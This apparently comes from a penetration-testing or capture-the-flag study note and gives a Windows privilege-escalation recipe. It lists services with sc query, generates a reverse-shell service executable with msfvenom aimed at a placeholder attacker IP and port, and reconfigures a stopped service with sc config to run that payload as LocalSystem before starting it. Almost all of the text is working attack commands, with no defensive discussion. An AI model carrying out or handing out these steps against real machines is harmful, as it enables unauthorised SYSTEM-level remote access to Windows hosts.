You can get a list of available services using the following command:

	sc query state=all

Find a service that is NOT running to modify.

Create a new reverse shell with msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER IP] LPORT=[PORT] -f exe-service -o rev-svc.exe
```

To reconfigure [service]'s' parameters, we can use the following command:

```
sc config [service] binPath= "C:\Windows\rev-svc.exe" start= auto obj= "LocalSystem"
```

Start service

	sc start [service]
